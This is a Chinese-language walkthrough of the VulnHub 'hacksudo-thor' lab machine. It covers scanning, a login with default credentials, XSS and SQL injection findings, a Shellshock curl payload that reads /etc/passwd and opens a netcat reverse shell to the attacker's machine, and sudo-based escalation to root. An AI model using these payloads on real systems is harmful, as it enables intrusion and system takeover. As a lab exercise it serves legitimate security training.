VulnHub-hacksudo-thor 靶场渗透
2021-08-15 16:35:08

靶场信息

地址：https://www.vulnhub.com/entry/hacksudo-thor,733/

发布日期：2021 年 8 月 3 日

难度：简单

目标：找到root.txt标志

描述：由 vishal Waghmare 创建的盒子 这个盒子应该是容易中的。这台机器是为信息安全准备而创建的

Discord 服务器 ( https://discord.gg/kDyAKtJs) 网站 (https://hacksudo.com)

这个盒子是为改进 Linux 特权升级而创建的，我希望你们喜欢。这个盒子是用 Virtualbox 创建的，但它应该可以与 VMWare Player 和 VMWare 工作站一起使用 启动后使用 netdiscover 工具查找 IP 地址，您可以在抓取页面上检查 ip。这是基于您拥有的任何设置的目标地址。您应该验证地址以防万一。

找到 root.txt 标志将其提交到 Discord 上的标志提交频道，并有机会免费获得 hacksudo 机器黑客课程。

这对 VirtualBox 比 VMware 更有效

运行：VirtualBox 6.1（仅主机模式网卡172.16.10.1）

前言

本次靶场使用VirtualBox 6.1进行构建。将我的kali系统和桥接在VirtualBox的仅主机网卡。本次演练使用kali系统按照渗透的过程进行操作。

环境配置

使用VirtualBox导入镜像之后，需要对网络进行配置。

1）VirtualBox配置Host-only网卡信息

打开主机网络管理器

设置网卡ip为172.16.10.1，应用

DHCP服务器配置，应用

2）网络设置为仅主机网络，其余默认

3）vmware配置桥接到virtualbox的仅主机网卡

4）启动

一、信息收集

1）确定目标

由于kali网络桥接在virtualBox的仅主机网卡，所以可以直接使用netdiscover扫描172.16.10.0网段存活主机

netdiscover -r 172.16.10.0/24 -i eth0

得到ip地址：172.16.10.106

2）端口扫描

nmap -v -T4 -p- -A -oN nmap.log 172.16.10.106

有价值的信息就是80端口了

3）访问靶机

http://172.16.10.106

4）使用dirsearch扫描目录列表

python3 dirsearch.py -u "http://172.16.10.106/"

得到三条有用信息

/README.md
/admin_login.php
/cgi-bin/     

5）访问/README.md

得到网站项目的一些说明，以及项目github地址

源码地址https://github.com/zakee94/online-banking-system
项目时间2017年
管理员默认用户名密码admin/password123

6）登录网站后台

http://172.16.10.106/admin_login.php
管理员默认用户名密码admin/password123

在网站后台发现存在搜索功能，以及普通用户的密码信息

zakee94/nafees123
salman/salman123
tushar/tushar123
jon/snow123

二、漏洞探测

1）xray被动扫描

.\xray.exe webscan --listen 127.0.0.1:7777 --html-output 1.html

分别对admin和普通用户的各个功能点进行测试，xray探测到了xss以及基于时间盲注的sql漏洞

xss
http://172.16.10.106/edit_customer.php?cust_id=%3CsCrIpT%3Ealert(1)%3C/ScRiPt%3E
基于时间盲注的sql漏洞
http://172.16.10.106/manage_customers.php
http://172.16.10.106/edit_customer.php
http://172.16.10.106/customer_transactions.php

通过使用sqlmap工具对漏洞进一步利用，发现虽然这是dba权限，但是不能使用os-shell进行漏洞利用。

2）/cgi-bin/信息

由于前面经过目录扫描得到此目录的响应码是403，猜测这里应该是存在信息的

在新闻页面的源码信息中查看到注释的/cgi-bin/更加确定了此处可疑

3）google查找/cgi-bin/相关的漏洞信息

/cgi-bin/ exploit shellshock github

https://github.com/opsxcq/exploit-CVE-2014-6271
​
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \http://localhost:8080/cgi-bin/vulnerable
​

需要找到易受攻击的脚本文件

python3 dirsearch.py -u "http://172.16.10.106/cgi-bin/" -i 200-599
得到
[12:25:16] 500 -  611B  - /cgi-bin/shell.sh

三、漏洞利用

1）命令执行

所以利用方式修改为

# 命令执行
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \http://172.16.10.106/cgi-bin/shell.sh
# 执行id看到是www权限
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'id'" \http://172.16.10.106/cgi-bin/shell.sh

2）反弹shell

# 判断靶机是否存在nc命令
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'which nc'" \http://172.16.10.106/cgi-bin/shell.sh
​
/usr/bin/nc
# 本地执行监听
nc -lvvp 8899
# nc反弹shell命令
nc -e /bin/bash x.x.x.x port
​
nc -e /bin/bash 172.16.10.102 8899
# 最终语句如下
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'nc -e /bin/bash 172.16.10.102 8899'" \http://172.16.10.106/cgi-bin/shell.sh

3）升级交互式shell

python3 -c 'import pty;pty.spawn("/bin/bash")'

四、提权

1）获取thor用户shell

# 查看当前用户的sudo权限，发现可以执行一个脚本
sudo -l
Matching Defaults entries for www-data on HackSudoThor:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
​
User www-data may run the following commands on HackSudoThor:
(thor) NOPASSWD: /home/thor/./hammer.sh
​
# 使用thor用户身份去运行此文件
sudo -u thor /home/thor/./hammer.sh
# 输入message的值为bash
# 升级交互式shell
SHELL=/bin/bash script -q /dev/null
# 或者python也可以
python3 -c 'import pty;pty.spawn("/bin/bash")'

2）提权到root

再次使用sudo -l查看不需要密码就可以执行的命令，存在service

在https://gtfobins.github.io/搜索service得到提权方法

sudo service ../../bin/sh

3）读取root.txt

rooted

总结

在此次演练中需要进行细致的信息搜集以获取cgi-bin exploit shellshock。

还有一点就是目录扫描，gobuster扫描目录方法，这里扫描到的/transactions.php页面存在绕过admin登录的逻辑漏洞

gobuster dir -u http://172.16.10.106/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php
​
gobuster dir -u http://172.16.10.106/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x py,sh,php -s 200,204,301,302,307,401,403,500
